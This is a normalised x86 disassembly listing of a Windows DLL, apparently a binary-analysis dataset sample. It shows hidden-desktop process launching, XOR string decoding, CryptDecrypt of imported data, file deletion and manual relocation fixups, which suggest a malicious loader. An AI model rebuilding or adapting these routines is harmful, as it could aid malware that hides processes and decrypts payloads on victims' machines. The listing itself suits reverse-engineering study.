cmp eax 0xa
jb r-xdata
xor eax eax
push eax
push __dos_header
push eax
push eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x14 ] ax
call [ CreateDesktopW@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x44
lea edx [ ebp - 0x2b4 ]
push 0x0
push edx
call sub_10078970
xor eax eax
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] eax
add esp 0xc
lea edx [ ebp - 0x40 ]
mov eax 0x11a
mov [ ebp - 0x2b4 ] 0x44
call sub_1001bb80
mov eax edx
lea ecx [ ebp - 0x264 ]
push ecx
lea edx [ ebp - 0x2b4 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
push 0x0
mov [ ebp - 0x2ac ] eax
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax 0x71
call sub_1001bb80
mov edi [ Sleep@IAT ]
mov esi [ EnumDesktopWindows@IAT ]
mov eax edx
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x268 ] 0x0
jmp r-xdata
push ebx
call [ CloseDesktop@IAT ]
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x64
call edi
lea ecx [ ebp - 0x254 ]
push ecx
push sub_1000e1e0
push ebx
mov [ ebp - 0x254 ] 0x0
call esi
cmp [ ebp - 0x254 ] 0x0
jne r-xdata
lea edx [ ebp - 0x24c ]
push edx
call [ SysAllocString@IAT ]
mov edx [ ebp - 0x254 ]
mov ecx [ ebp - 0x26c ]
mov esi [ PostMessageW@IAT ]
push 0x0
push 0x0
push 0x10
push edx
mov [ ecx ] eax
call esi
mov eax [ ebp - 0x254 ]
push 0x0
push 0x0
push 0x12
push eax
call esi
xor esi esi
lea esp [ esp ]
mov eax [ ebp - 0x268 ]
inc eax
mov [ ebp - 0x268 ] eax
cmp eax 0x258
jl r-xdata
mov edx [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ ebp - 0x264 ]
push eax
call esi
push ebx
call [ CloseDesktop@IAT ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
inc esi
cmp esi 0x12c
jl r-xdata
mov edx [ ebp - 0x264 ]
push 0x0
push edx
call [ TerminateProcess@IAT ]
mov eax [ ebp - 0x260 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ ebp - 0x264 ]
push ecx
call esi
push ebx
call [ CloseDesktop@IAT ]
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x64
call edi
mov ecx [ ebp - 0x254 ]
push ecx
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x264 ]
push 0x0
push ecx
call [ TerminateProcess@IAT ]
sub_10015620
mov [ esi ] r--data
push ebx
xor ebx ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x34 ] 0xf
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] bl
mov [ esi + 0x384 ] ebx
mov [ esi + 0x39c ] 0x1
mov [ esi + 0x3a0 ] ebx
mov [ esi + 0x3a4 ] ebx
mov [ esi + 0x3a8 ] ebx
mov [ esi + 0x3b0 ] ebx
mov [ esi + 0x3b4 ] ebx
mov [ esi + 0x3b8 ] ebx
mov [ esi + 0x3c0 ] ebx
mov [ esi + 0x3c4 ] ebx
mov [ esi + 0x3c8 ] ebx
mov [ esi + 0x3d0 ] ebx
call [ GetCurrentThreadId@IAT ]
push rw-data
mov [ esi + 0x374 ] eax
mov [ esi + 0x37c ] 0x1
call [ InterlockedIncrement@IAT ]
mov [ esi + 0x378 ] eax
mov [ esi + 0x380 ] ebx
mov eax esi
pop ebx
retn
sub_100156c0
push ebp
mov ebp esp
sub esp 0x9c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x90 ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x75
and edx 0xff
mov [ ebp + eax * 2 - 0x50 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x90 ]
push edx
mov [ ebp - 0x30 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x50 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0xfc ] 0x8
lea eax [ edi + 0xe8 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x2c ]
mov eax 0xb9
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_1000a6f0
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0x90 ]
push eax
push r--data
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0x90 ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x4a
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x94 ] ebx
call sub_1000a6f0
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x98 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0x8c ]
mov eax 0x119
call sub_1000a6f0
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
lea edx [ ebp - 0x94 ]
push edx
mov edx [ ebp - 0x90 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x94 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xad
call sub_1000a6f0
mov [ ebp - 0x9c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x90 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x94 ] ebx
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0x9c ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_10015890
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
xor esi esi
push 0x4
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] esi
mov [ edi + 0x14 ] eax
push esi
mov [ edi + 0x18 ] esi
mov [ edi + 0x1c ] esi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x1c ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x24 ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x28 ] esi
mov [ edi + 0x2c ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x2c ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x30 ] esi
mov [ edi + 0x34 ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x34 ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x38 ] esi
mov [ edi + 0x3c ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
dec [ ebx ]
jne r-xdata
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push esi
mov [ edi + 0x3c ] eax
inc [ eax ]
mov eax [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
mov esi edi
call sub_10008200
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
inc [ ebx ]
lea eax [ ebp - 0xc ]
lea esi [ edi + 0x20 ]
mov [ ebp - 0xc ] ecx
cmp esi eax
je r-xdata
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x14
test ecx ecx
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] ebx
inc [ ebx ]
mov esi [ esi ]
test esi esi
je r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi ecx
call sub_10020880
mov eax [ edi + 0x24 ]
lea esi [ edi + 0x20 ]
test eax eax
je r-xdata
call sub_10020880
mov ecx [ ebp - 0xc ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0xc ]
sub_100159e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_10054678
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10058442
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10015a9a
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10018722
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10015b40
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10082876
mov eax [ fs : 0x0 ]
push eax
sub esp 0x318
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x310 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x328 ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor ebx ebx
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x330 ] ebx
lea eax [ esp + 0x34 ]
mov ecx edi
lea esi [ esp + 0x44 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
call sub_1002e360
mov [ esp + 0x330 ] 0x1
mov esi [ esp + 0x34 ]
cmp esi ebx
je r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edx [ esp + 0x9c ]
mov eax 0xc4
call sub_1001bb80
cmp [ edi + 0x8 ] ebx
je r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
push edx
push esi
call sub_100624a0
push esi
call sub_10065045
add esp 0x14
mov ecx [ esp + 0x328 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x310 ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ esp + 0x9c ]
mov eax 0x123
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
cmp [ esp + 0x24 ] ebx
je r-xdata
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x20 ]
lea edi [ esp + 0x28 ]
lea esi [ esp + 0x48 ]
call sub_10032770
cmp eax ebx
je r-xdata
mov eax 0x2
jmp r-xdata
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
mov eax [ esp + 0x1c ]
cmp eax 0x1e84800
jge r-xdata
lea edx [ esp + 0x18 ]
mov eax 0xae
call sub_1001bb80
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x12c ]
mov [ esp + 0x38 ] 0x1
call sub_10024da0
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
push ebx
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10010790
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
push edx
push eax
lea eax [ esp + 0x11c ]
call sub_1000c170
add esp 0x8
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x1c
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
lea esi [ esp + 0x24 ]
call sub_1002e400
mov eax 0x3
jmp r-xdata
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
cmp esi edi
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
cmp esi edi
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
cmp [ esp + 0x20 ] ebx
je r-xdata
lea esp [ esp ]
lea edx [ esp + 0x9c ]
mov eax 0x3e
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
lea edx [ esp + 0x114 ]
push edx
call sub_10068660
cmp eax ebx
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x1c
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
xor eax eax
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
jmp r-xdata
lea ecx [ esp + 0x114 ]
push ecx
call [ DeleteFileW@IAT ]
lea eax [ esp + 0x114 ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x9c ]
mov eax 0x1c
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov eax 0x4
jmp r-xdata
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
mov eax 0x5
jmp r-xdata
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
sub_10015ec0
push esi
mov esi eax
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call edi
mov esi [ esi ]
test esi esi
je r-xdata
mov [ esi + 0x20 ] 0x0
pop edi
pop esi
retn
push esi
call edi
sub_10015f10
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax edx
sub eax [ ecx + 0x34 ]
push ebx
mov ebx [ ecx + 0xa4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0xa0 ]
add eax edx
test ebx ebx
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push edi
jmp r-xdata
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
add esi edx
lea edx [ eax + 0x8 ]
sub ebx ecx
lea edi [ ecx - 0x8 ]
add eax ecx
xor ecx ecx
shr edi 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] ebx
je r-xdata
test ebx ebx
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
pop edi
pop esi
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ edx + ecx * 2 ]
and edx 0xfff
add [ edx + esi ] ebx
mov edx [ ebp - 0x8 ]
cmp [ edx + ecx * 2 ] 0x0
je r-xdata
mov ebx [ ebp - 0xc ]
sub_10015f91
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_10054678
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10044041
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10057899
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
sub_10016040
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000e930
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10016070
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x9b
cmp eax 0x3
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x28 ]
mov [ esi ] eax
mov eax [ ecx + 0x2c ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x70
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call sub_1000a6f0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_100160f5
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
xor edi edi
push edi
xor esi esi
inc esi
push esi
push r--data
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push [ eax ]
push edi
push esi
mov esi [ CryptDecrypt@IAT ]
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
call sub_1000eb9b
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
pop esi
leave
retn 0x10
mov eax esi
cmp eax edi
je r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop ebx
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebx ]
push [ ebp + 0x8 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push ebx
push [ eax ]
push edi
push 0x1
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_100161f2
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_1004cd62
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_10016260
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f330
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x1fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x3
cmp eax ecx
jae r-xdata
push r--data
call sub_100616c6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_10044f40
mov ebx eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push eax
mov eax ebx
mov [ ebp - 0x14 ] ebx
call sub_10057150
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0x4
sar edi 0x3
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ ebx + ecx * 8 ]
lea eax [ ebx + edi * 8 ]
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
push eax
call sub_10065045
add esp 0x4
sub_10016324
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_1002868d
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_10037533
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x18
sub_100163c0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x44 ] eax
mov esi ecx
test edi edi
jne r-xdata
push edi
push ebx
push esi
push 0x0
call sub_1001b530
add esp 0x10
cmp eax 0xffffffd6
je r-xdata
lea eax [ edi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi ]
inc ecx
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp - 0x44 ]
push edi
push ebx
push esi
push eax
mov [ edx ] eax
call sub_1001b530
add esp 0x10
test eax eax
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0xc
call sub_100328b0
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebp - 0x44 ]
mov eax [ esi ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x40 ]
mov eax 0xc
mov [ esi ] 0x0
call sub_100328b0
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_100164a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081801
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x30 ] edi
push 0x7
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ ebp - 0x34 ] esi
mov [ esi ] ax
call sub_1005e3c0
mov [ ebp - 0x4 ] edi
mov edi [ ebx + 0xc4 ]
mov [ ebp - 0x30 ] 0x1
cmp edi [ ebx + 0xc8 ]
je r-xdata
push 0x8
push r--data
mov ecx esi
call sub_10023990
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea esp [ esp ]
add edi 0x4
